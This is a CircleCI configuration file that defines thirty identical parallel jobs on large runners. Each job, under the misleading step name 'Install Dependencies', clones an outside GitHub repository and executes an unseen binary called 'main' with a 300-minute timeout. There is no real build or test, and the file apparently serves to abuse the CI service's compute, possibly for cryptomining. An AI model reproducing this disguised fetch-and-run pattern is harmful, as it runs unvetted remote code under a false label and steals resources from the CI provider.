version: 2
jobs:
    aku1:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku2:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku3:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku4:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku5:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku6:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku7:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku8:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku9:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku10:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku11:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku12:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku13:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku14:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku15:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku16:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku17:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku18:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku19:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku20:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku21:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku22:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku23:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku24:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku25:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku26:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku27:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku28:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku29:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m
    aku30:
      docker:
            - image: ruby
      resource_class: large
      steps:
        - run:
            name: Install Dependencies
            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
            no_output_timeout: 300m

workflows:
    version: 2
    build:
        jobs:
            - aku1
            - aku2
            - aku3
            - aku4
            - aku5
            - aku6
            - aku7
            - aku8
            - aku9
            - aku10
            - aku11
            - aku12
            - aku13
            - aku14
            - aku15
            - aku16
            - aku17
            - aku18
            - aku19
            - aku20
            - aku21
            - aku22
            - aku23
            - aku24
            - aku25
            - aku26
            - aku27
            - aku28
            - aku29
            - aku30
